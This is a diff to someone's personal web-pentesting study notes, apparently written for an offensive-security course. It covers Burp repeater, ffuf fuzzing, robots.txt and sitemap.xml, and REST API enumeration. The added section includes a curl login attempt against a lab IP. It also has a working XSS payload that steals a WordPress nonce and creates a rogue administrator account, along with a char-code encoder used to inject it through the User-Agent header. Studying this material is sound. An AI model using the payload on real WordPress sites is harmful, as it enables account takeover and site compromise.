@@ -24,6 +24,12 @@
 		- get packet from "proxy" and send to intruder
 		- select portion to fuzz
 		- enter wordlist and run
+	- repeater 
+		- repeatedly send modified header such as 
+			- user agent
+			- cookies
+			- host
+		- used to pass on credentials/test server response 
 - Fuff
 	- fuzzing post and get request
 	- post
@@ -60,7 +66,7 @@
 - debugging - open webapp files
 	- click on curly braces on bottom left to pretty print the minimised script
 - inspect - drill down to selected html element
-**robot.txt**
+**robot.txt sitemap.xml (maps)**
 - list of disallowed directories and allowed directories for web spiders
 - disallowed directories might be points of entry
 - most case, can inform on webapp structure
@@ -69,6 +75,7 @@ Representational State transfer (REST) api
 used for authentication and session
 directory names are very descriptive 
 ##### worked example
+- scan ports for open api ports
 - generate a pattern file named "pattern"
 	- 
 ```
@@ -88,4 +95,59 @@ directory names are very descriptive
 	- curl -i http://example/user/v1/login
 	- ![[Pasted image 20261011051537.png]]
 	- api working. No user named "login". but also no login page
+	- crack password
+		- `curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login`
+			- -H header
+				- [[Content-Type]] : application/json
+	- create account 
+	- retrieve authentication key(rsa) and spoof in header while loggin in as admin
+### Identifying base64 codes
+- Upper and lower case characters
+- Numbers 
+-  = as padding at end
+- length is multiple of 4
+### XSS
+[[Cross site scripting]]
+worked examples
+- add query to current html file to fetch nonce 
+```
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+
+```
+- `"([^"]*?)"/g` - matchnes as alphanumeric value 
+```
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+
+```
+- `user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pas...` - create a new account with details
+- minimise the two code blocks and encode it
+```
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+
+```
+- charcodeat - convert ascii to encodable int values representation  due to utf-8 65565 memory limit
+- insert it as the user-agent field and the script should be injected and account should be created
 - 
